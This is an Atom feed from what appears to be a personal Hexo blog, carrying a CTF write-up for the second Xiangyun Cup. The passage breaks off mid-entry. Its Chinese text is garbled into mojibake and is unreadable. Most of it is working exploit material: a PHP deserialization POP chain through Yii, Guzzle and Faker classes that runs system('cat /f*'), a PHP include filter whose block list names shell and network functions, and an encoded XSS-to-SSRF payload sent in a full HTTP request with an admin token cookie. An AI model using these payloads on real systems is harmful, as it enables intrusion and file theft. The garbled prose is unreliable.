<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Rossweisse</title>
  
  
  <link href="https://lucifer-rossweisse.github.io/atom.xml" rel="self"/>
  
  <link href="https://lucifer-rossweisse.github.io/"/>
  <updated>2021-08-26T04:52:55.203Z</updated>
  <id>https://lucifer-rossweisse.github.io/</id>
  
  <author>
    <name>Rossweisse</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ç¬¬äºŒå±Šç¥¥äº‘æ¯éƒ¨åˆ†WP</title>
    <link href="https://lucifer-rossweisse.github.io/2021/08/23/WriteUp/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF/"/>
    <id>https://lucifer-rossweisse.github.io/2021/08/23/WriteUp/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF/</id>
    <published>2021-08-23T09:44:40.000Z</published>
    <updated>2021-08-26T04:52:55.203Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezyii"><a href="#ezyii" class="headerlink" title="ezyii"></a>ezyii</h3><p>yii çš„ popé“¾å­ï¼Œå…ˆè´´poc:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>\<span class="title">AppendStream</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span>  <span class="title">RunProcess</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$output</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processes</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes[] = <span class="keyword">new</span> DefaultGenerator(<span class="keyword">new</span> AppendStream());</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output = <span class="keyword">new</span> DefaultGenerator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> RunProcess()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">AppendStream</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$streams</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$seekable</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;streams[] = <span class="keyword">new</span> CachingStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">CachingStream</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$remoteStream</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;remoteStream = <span class="keyword">new</span> DefaultGenerator(<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;stream = <span class="keyword">new</span>  PumpStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PumpStream</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$source</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span> = <span class="number">-10</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$buffer</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;buffer = <span class="keyword">new</span> DefaultGenerator();</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;closure/autoload.php&quot;</span>);</span><br><span class="line">            <span class="variable">$a</span> = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                system(<span class="string">&#x27;cat /f*&#x27;</span>);</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="variable">$a</span> = \Opis\<span class="built_in">Closure</span>\serialize(<span class="variable">$a</span>);</span><br><span class="line">            <span class="variable">$b</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="variable">$b</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…·ä½“æ€è·¯å°±æ˜¯ä» <code>RunProcess</code> ç±»å…¥æ‰‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stopProcess</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (array_reverse(<span class="keyword">$this</span>-&gt;processes) <span class="keyword">as</span> <span class="variable">$process</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$process</span>-&gt;isRunning()) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output-&gt;debug(<span class="string">&#x27;[RunProcess] Stopping &#x27;</span> . <span class="variable">$process</span>-&gt;getCommandLine());</span><br><span class="line">            <span class="variable">$process</span>-&gt;stop();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;processes = [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥è§¦å‘ <code>DefaultGenerator</code> ç±»ä¸­çš„ <code>__call</code> é­”æœ¯æ–¹æ³•</p><p>ç„¶åç”± return å¯è§¦å‘ <code>AppendStream</code> ç±»ä¸­çš„ <code>__toString</code> é­”æœ¯æ–¹æ³•</p><p><code>AppendStream</code> ç±»ä¸­åˆ™å¯ä»¥é€šè¿‡ <code>$stream-&gt;rewind()</code> å»æ‰§è¡Œ <code>CachingStream</code> ç±»ä¸­çš„  <code>rewind()</code> æ–¹æ³•</p><p>ç„¶åé€šè¿‡ <code>CachingStream</code> ç±»ä¸­çš„ <code>$this-&gt;stream-&gt;read($length)</code> å»æ‰§è¡Œ <code>PumpStream</code> ç±»ä¸­çš„ <code>read()</code>æ–¹æ³•ï¼Œè¿›è€Œå¾—åˆ° <code>call_user_func</code> å‡½æ•°çš„æ§åˆ¶æƒï¼Œå°±å¯ä»¥æ³¨å…¥ shell äº†ï¼Œè¿™é‡Œç”¨äº†æ„é€  <code>function</code> çš„æ–¹æ³•ï¼Œè¦æ³¨æ„ç›´æ¥æ„é€ ç„¶åæ‰§è¡Œ poc æ˜¯è·‘ä¸é€šçš„ï¼Œå¯ä»¥åˆ©ç”¨ <code>\Opis\Closure\serialize</code> ç±»ä¸­çš„åºåˆ—åŒ–æ–¹æ³•åºåˆ—åŒ–åå†ååºåˆ—åŒ–ç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AppendStreamç±»</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;streams <span class="keyword">as</span> <span class="variable">$i</span> =&gt; <span class="variable">$stream</span>) &#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$stream</span>-&gt;rewind();</span><br><span class="line">         &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">RuntimeException</span>(<span class="string">&#x27;Unable to seek stream &#x27;</span></span><br><span class="line">                . <span class="variable">$i</span> . <span class="string">&#x27; of the AppendStream&#x27;</span>, <span class="number">0</span>, <span class="variable">$e</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CachingStreamç±»</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># seekæ–¹æ³•ä¸­</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$diff</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$diff</span> &gt; <span class="number">0</span> &amp;&amp; !<span class="keyword">$this</span>-&gt;remoteStream-&gt;eof()) &#123; <span class="comment">//è¿™é‡Œè¦æ³¨æ„ï¼Œä¸ºäº†èƒ½é€šè¿‡è¿™ä¸€æ­¥è¿›å…¥åˆ° read æ–¹æ³•ï¼ŒremoteStream å±æ€§è¦ä¿®æ”¹ï¼Œå…·ä½“çœ‹poc</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;read(<span class="variable">$diff</span>);</span><br><span class="line">            <span class="variable">$diff</span> = <span class="variable">$byte</span> - <span class="keyword">$this</span>-&gt;stream-&gt;getSize();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;stream-&gt;seek(<span class="variable">$byte</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># readæ–¹æ³•ä¸­</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;stream-&gt;read(<span class="variable">$length</span>);</span><br><span class="line"><span class="variable">$remaining</span> = <span class="variable">$length</span> - strlen(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p>flag:</p><blockquote><p>flag{e09e57a3-0060-4abf-97fe-e89cb9ebb2ba}</p></blockquote><h3 id="å®‰å…¨æ£€æµ‹"><a href="#å®‰å…¨æ£€æµ‹" class="headerlink" title="å®‰å…¨æ£€æµ‹"></a>å®‰å…¨æ£€æµ‹</h3><p>å…ˆæ˜¯ SSRF è¯»æ–‡ä»¶ï¼Œ<code>http://127.0.0.1/admin/include123.php</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;\/\*|\*|\.\.\/|\.\/|load_file|outfile|dumpfile|sub|hex|where&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .= <span class="string">&quot;|file_put_content|file_get_content|fwrite|curl|system|eval|assert&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|`|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec|http|.php|.ph|.log|\@|:\/\/|flag|access|error|stdout|stderr&quot;</span>;</span><br><span class="line"><span class="variable">$pattern</span> .=<span class="string">&quot;|file|dict|gopher&quot;</span>;</span><br><span class="line"><span class="comment">//ç´¯äº†ç´¯äº†ï¼Œé¥®èŒ¶å…ˆ</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$vpattern</span> = explode(<span class="string">&quot;|&quot;</span>,<span class="variable">$pattern</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$vpattern</span> <span class="keyword">as</span> <span class="variable">$value</span>)&#123;    </span><br><span class="line">    <span class="keyword">if</span> (preg_match( <span class="string">&quot;/<span class="subst">$value</span>/i&quot;</span>, <span class="variable">$u</span> ))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æ£€æµ‹åˆ°æ¶æ„å­—ç¬¦&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$u</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>banäº†å¾ˆå¤šä¸œè¥¿ï¼Œç”¨ <code>PHP_SESSION_UPLOAD_PROGRESS</code> è¿›è¡Œç»•è¿‡ã€‚(æ³¨æ„ä¸€å¥è¯æœ¨é©¬ä¸èƒ½å­˜åœ¨ç©ºæ ¼</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210821204720702.png"></p><p>è·å–åˆ°ç›®å½•æ–‡ä»¶åˆ—è¡¨ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210821204756344.png"></p><p>å‘ç° <code>getflag.sh</code> æ–‡ä»¶ï¼Œç›´æ¥æ‰§è¡Œå°±èƒ½æ‹¿åˆ° flag äº†ã€‚</p><p><img src="https://gitee.com/R1ta_Violet/blogimg/raw/master/imgs/image-20210821205010903.png"></p><p>flag:</p><blockquote><p>flag{57f1a008-f506-47a8-9174-ae307941d7b5}</p></blockquote><h3 id="secrets-of-admin-unsolve"><a href="#secrets-of-admin-unsolve" class="headerlink" title="secrets_of_admin(unsolve)"></a>secrets_of_admin(unsolve)</h3><p>è¿™é¢˜ä¹‹åå¤ç°æ„Ÿè§‰å…¶å®æŒºç®€å•çš„ï¼Œä¸»è¦è¿˜æ˜¯ä»£ç å®¡è®¡ã€‚</p><p>åœ¨ <code>database.ts</code> ä¸­å¯ä»¥å‘ç° <code>admin</code> çš„ <code>password</code> =&gt; <code>e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645</code> ï¼Œä¹Ÿå¯ä»¥çŸ¥é“ flag çš„ checksum =&gt; <code>be5a14a8e504a66979f6938338b0662c</code>ã€‚</p><p>å‘ç°å¯ä»¥åˆ©ç”¨ 127.0.0.1 æ·»åŠ æ–‡ä»¶è®°å½•çš„è·¯ç”±ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// You can also add file logs here!</span></span><br><span class="line">router.get(<span class="string">&#x27;/api/files&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.socket.remoteAddress.replace(<span class="regexp">/^.*:/</span>, <span class="string">&#x27;&#x27;</span>) != <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> next(createError(<span class="number">401</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> &#123; username , filename, checksum &#125; = req.query;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span>(username) == <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(filename) == <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(checksum) == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> DB.Create(username, filename, checksum)</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Done&#x27;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Error!&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(<span class="string">&#x27;Parameters error&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å› æ­¤è€ƒè™‘å°† flag çš„æ–‡ä»¶åŒæ—¶å±äº adminï¼Œè¿™æ ·å°±å¯ä»¥åˆ©ç”¨å®ƒçš„ checksum è¿›è¡Œè¯»å–ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªè·¯ç”±ã€‚(åº”è¯¥æ˜¯ä¸ª html è½¬ pdf çš„è·¯ç”±</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/admin&#x27;</span>, checkAuth, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; content &#125; = req.body;</span><br><span class="line">    <span class="keyword">if</span> ( content == <span class="string">&#x27;&#x27;</span> || content.includes(<span class="string">&#x27;&lt;&#x27;</span>) || content.includes(<span class="string">&#x27;&gt;&#x27;</span>) || content.includes(<span class="string">&#x27;/&#x27;</span>) || content.includes(<span class="string">&#x27;script&#x27;</span>) || content.includes(<span class="string">&#x27;on&#x27;</span>))&#123;</span><br><span class="line">        <span class="comment">// even admin can&#x27;t be trusted right ? :)  </span></span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Forbidden word ğŸ¤¬&#x27;</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;utf8&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Create your own pdfs&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;<span class="subst">$&#123;content&#125;</span>&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        `</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> filename = <span class="string">`<span class="subst">$&#123;uuid()&#125;</span>.pdf`</span></span><br><span class="line">            pdf.create(template, &#123;</span><br><span class="line">                <span class="string">&quot;format&quot;</span>: <span class="string">&quot;Letter&quot;</span>,</span><br><span class="line">                <span class="string">&quot;orientation&quot;</span>: <span class="string">&quot;portrait&quot;</span>,</span><br><span class="line">                <span class="string">&quot;border&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;pdf&quot;</span>,</span><br><span class="line">                <span class="string">&quot;renderDelay&quot;</span>: <span class="number">3000</span>,</span><br><span class="line">                <span class="string">&quot;timeout&quot;</span>: <span class="number">5000</span></span><br><span class="line">            &#125;).toFile(<span class="string">`./files/<span class="subst">$&#123;filename&#125;</span>`</span>, <span class="keyword">async</span> (err, _) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) next(createError(<span class="number">500</span>));</span><br><span class="line">                <span class="keyword">const</span> checksum = <span class="keyword">await</span> getCheckSum(filename);</span><br><span class="line">                <span class="keyword">await</span> DB.Create(<span class="string">&#x27;superuser&#x27;</span>, filename, checksum)</span><br><span class="line">                <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">message</span> : <span class="string">`Your pdf is successfully saved ğŸ¤‘ You know how to download it right?`</span>&#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">error</span> : <span class="string">&#x27;Failed to generate pdf ğŸ˜¥&#x27;</span>&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>ç”¨ include è¿‡æ»¤äº†äº›ä¸œè¥¿ï¼Œåˆ©ç”¨æ•°ç»„ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content[]&#x3D;%3Cscript%3Evar%20url%3D%22http%3A%2F%2F127%2E0%2E0%2E1%3A8888%2Fapi%2Ffiles%3Fusername%3Dadmin%26filename%3D%2E%2E%2Ffiles%2Fflag%26checksum%3Dbe5a14a8e504a66979f6938338b0662c%22%3Bquery%3Dnew%20XMLHttpRequest%28%29%3Bquery%2Eopen%28%27get%27%2Curl%29%3Bquery%2Esend%28%29%3B%3C%2Fscript%3E</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;admin HTTP&#x2F;1.1</span><br><span class="line">Host: 189e45c2-c278-4154-a99a-f60a5dcb08c1.node4.buuoj.cn:81</span><br><span class="line">Content-Length: 301</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http:&#x2F;&#x2F;189e45c2-c278-4154-a99a-f60a5dcb08c1.node4.buuoj.cn:81</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;92.0.4515.159 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;189e45c2-c278-4154-a99a-f60a5dcb08c1.node4.buuoj.cn:81&#x2F;admin</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: UM_distinctid&#x3D;17b29115fe6634-088485bbacdf7c-4343363-1fa400-17b29115fe7d9a; token&#x3D;s%3Aj%3A%7B%22username%22%3A%22admin%22%2C%22files%22%3A%5B%5D%2C%22isAdmin%22%3Atrue%7D.F56WSi1msokS7QwqhYWcJm%2FBhe1UiZ%2FxOtKnM%2BaehVU</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">content[]&#x3D;%3Cscript%3Evar%20url%3D%22http%3A%2F%2F127%2E0%2E0%2E1%3A8888%2Fapi%2Ffiles%3Fusername%3Dadmin%26filename%3D%2E%2E%2Ffiles%2Fflag%26checksum%3Dbe5a14a8e504a66979f6938338b0662c%22%3Bquery%3Dnew%20XMLHttpRequest%28%29%3Bquery%2Eopen%28%27get%27%2Curl%29%3Bquery%2Esend%28%29%3B%3C%2Fscript%3E</span><br></pre></td></tr></table></figure><p>flag:</p><blockquote><p>flag{713393c3-9f68-4719-bac4-649c9cf12eb9}</p></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="é¸£é›æ‹"><a href="#é¸£é›æ‹" class="headerlink" title="é¸£é›æ‹"></a>é¸£é›æ‹</h3><p>è½¬ zip æ ¼å¼æ‰“å¼€å‹ç¼©åŒ…ï¼Œåœ¨ _rels ä¸­å‘ç° <code>key.txt</code> å’Œ 